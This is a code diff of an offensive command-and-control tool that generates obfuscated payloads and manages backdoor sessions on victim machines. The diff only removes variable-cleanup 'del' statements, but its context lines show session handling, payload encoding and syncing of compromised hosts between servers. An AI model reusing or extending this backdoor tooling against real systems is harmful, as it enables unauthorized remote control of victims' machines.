@@ -234,7 +234,6 @@ class Payload_generator:
 
 		payload = self.obfuscator.mask_payload(payload) if boolean_args['obfuscate'] else payload
 		payload = self.encodeUTF16(payload) if boolean_args['encode'] else payload
-		del boolean_args
 
 		print(f'{PLOAD}{payload}{END}')
 
@@ -579,8 +578,6 @@ class Sessions_manager:
 		if corrupted:
 			print(f'\r[{WARN}] {corrupted} x Corrupted session data entries omitted.')
 			print(f'[{WARN}] Possible reason: Incomplete payload execution on victim.\n')
-
-		del active_sessions_clone, tmp
 		return sessions_list
 
 
@@ -610,8 +607,6 @@ class Sessions_manager:
 				if active_sessions_clone[session_id]['aliased']:
 					if active_sessions_clone[session_id]['alias'] == alias:
 						sid = session_id
-
-		del active_sessions_clone, active_sessions
 		return sid
 
 
@@ -897,7 +892,6 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			new_session_data['aliased'] = False
 			new_session_data['self_owned'] = False	
 			Core_server.announce_new_session(new_session_data)
-			del new_session_data
 
 
 		# Grab cmd
@@ -970,10 +964,6 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 					elif isinstance(output, list):
 						Core_server.send_receive_one_encrypted(output[0], error_msg, 'command_output', 30)
-
-					del error_msg
-
-				del output
 
 
 		else:
@@ -1270,7 +1260,6 @@ class Core_server:
 						Sessions_manager.active_sessions[new_session_id] = decrypted_data[1]							
 						print(f'\r[{GREEN}Shell{END}] Backdoor session established on {ORANGE}{Sessions_manager.active_sessions[new_session_id]["IP Address"]}{END} (Owned by {ORANGE}{self.sibling_servers[sibling_id]["Hostname"]}{END})')
 						Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
-						del decrypted_data, new_session_id						
 						Core_server.send_msg(conn, self.response_ack(sibling_id))
 
 
@@ -1287,7 +1276,6 @@ class Core_server:
 							Hoaxshell.deactivate_shell()
 
 						Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
-						del session_id, status
 
 
 
@@ -1300,8 +1288,6 @@ class Core_server:
 
 						if Hoaxshell.active_shell == decrypted_data[1]['session_id']:
 							Hoaxshell.deactivate_shell()
-
-						del victim_ip	
 						Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()				
 						Core_server.send_msg(conn, self.response_ack(sibling_id))
 
@@ -1333,7 +1319,6 @@ class Core_server:
 						print(f'\r[{WARN}] Sibling server {ORANGE}{server_ip}{END} (hostname: {ORANGE}{hostname}{END}) disconnected.')
 						print(f'\r[{WARN}] {lost_sessions} x backdoor sessions lost.') if lost_sessions else chill()
 						Main_prompt.rst_prompt() if not Hoaxshell.active_shell else Hoaxshell.rst_shell_prompt()
-						del server_ip, hostname, active_sessions_clone, active_sessions
 						Core_server.send_msg(conn, self.response_ack(sibling_id))
 
 
@@ -1358,8 +1343,6 @@ class Core_server:
 		if rst_prompt:			
 			Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell \
 			else Hoaxshell.set_shell_prompt_ready()
-
-		del raw_data, str_data			
 		Threading_params.thread_limiter.release()
 		return
 
@@ -1531,8 +1514,6 @@ class Core_server:
 			for sibling_id in siblings:
 				Core_server.send_receive_one_encrypted(sibling_id, new_session_data_dict, 'new_session')
 
-		del siblings
-
 
 
 	@staticmethod
@@ -1543,8 +1524,6 @@ class Core_server:
 		if siblings:			
 			for sibling_id in siblings:
 				Core_server.send_receive_one_encrypted(sibling_id, new_session_data_dict, 'shell_session_status_update')
-
-		del siblings
 
 
 
@@ -1557,8 +1536,6 @@ class Core_server:
 
 			for sibling_id in siblings:
 				Core_server.send_receive_one_encrypted(sibling_id, terminated_session_data_dict, 'session_terminated')
-
-		del siblings
 
 
 
@@ -1831,6 +1808,4 @@ class Core_server:
 		if corrupted:
 			print(f'\r[{WARN}] {corrupted} x Corrupted sibling server data entries omitted.')
 			print(f'[{WARN}] Possible reason: Sibling server disconnected inelegantly.\n')
-
-		del siblings_clone, tmp
 		return siblings_list
